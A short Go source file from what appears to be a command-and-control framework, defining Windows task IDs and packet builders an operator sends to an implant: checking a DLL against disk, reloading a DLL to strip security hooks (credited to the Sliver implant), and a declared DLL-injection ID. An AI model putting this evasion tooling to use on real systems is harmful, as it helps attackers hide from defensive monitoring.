package wintask

import "github.com/iDigitalFlame/xmt/com"

// Base is the base TaskID for the wintask package.
// This is added to the base on init when the package is loaded.
const Base uint8 = 0xD0

// Wv* ID Values are Windows-specific ID values that will not be present
// on *nix systems.
const (
	WvCheckDLL  uint8 = 0xD0
	WvReloadDLL uint8 = 0xD1
	WvInjectDLL uint8 = 0xD2
)

// CheckDLL is a similar function to ReloadDLL.
// This function will return 'true' if the contents in memory match the
// contents of the file on disk. Otherwise it returns false.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: WvCheckDLL
//
//  Input:
//      - string (DLL Name)
//  Output:
//      - bool (Result of evade.CheckDLL)
func CheckDLL(d string) *com.Packet {
	n := &com.Packet{ID: WvCheckDLL}
	n.WriteString(d)
	return n
}

// ReloadDLL is a function shamelessly stolen from the sliver project. This
// function will read a DLL file from on-disk and rewrite over it's current
// in-memory contents to erase any hooks placed on function calls.
//
// Re-mastered and refactored to be less memory hungry and easier to read :P
//
// Orig src here:
//   https://github.com/BishopFox/sliver/blob/f94f0fc938ca3871390c5adfa71bf4edc288022d/implant/sliver/evasion/evasion_windows.go#L116
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: WvReloadDLL
//
//  Input:
//      - string (DLL Name)
//  Output:
//      NONE
func ReloadDLL(d string) *com.Packet {
	n := &com.Packet{ID: WvReloadDLL}
	n.WriteString(d)
	return n
}
